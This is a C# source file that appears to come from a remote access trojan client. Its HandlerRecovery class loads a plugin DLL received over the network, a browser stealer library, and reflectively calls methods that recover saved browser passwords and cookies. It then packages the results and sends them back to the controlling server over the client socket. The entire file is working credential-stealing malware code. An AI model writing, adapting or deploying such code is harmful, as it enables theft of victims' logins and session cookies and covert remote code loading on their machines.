using Client.MessagePack;
using Client.Sockets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Diagnostics;
namespace Client.Handle_Packet
{
   public class HandlerRecovery
    {
        public HandlerRecovery(MsgPack unpack_msgpack)
        {
            try
            {
                // DLL StealerLib => gitlab.com/thoxy/stealerlib
                Assembly loader = Assembly.Load(unpack_msgpack.ForcePathObject("Plugin").GetAsBytes());
                MethodInfo meth = loader.GetType("StealerLib.Browsers.CaptureBrowsers").GetMethod("RecoverCredential");
                MethodInfo meth2 = loader.GetType("StealerLib.Browsers.CaptureBrowsers").GetMethod("RecoverCookies");
                object injObj = loader.CreateInstance(meth.Name);
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
                msgpack.ForcePathObject("Password").AsString = (string)meth.Invoke(injObj, null);
                msgpack.ForcePathObject("Cookies").AsString = (string)meth2.Invoke(injObj, null);
                ClientSocket.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                Packet.Error(ex.Message);
            }
            return;
        }
    }
}
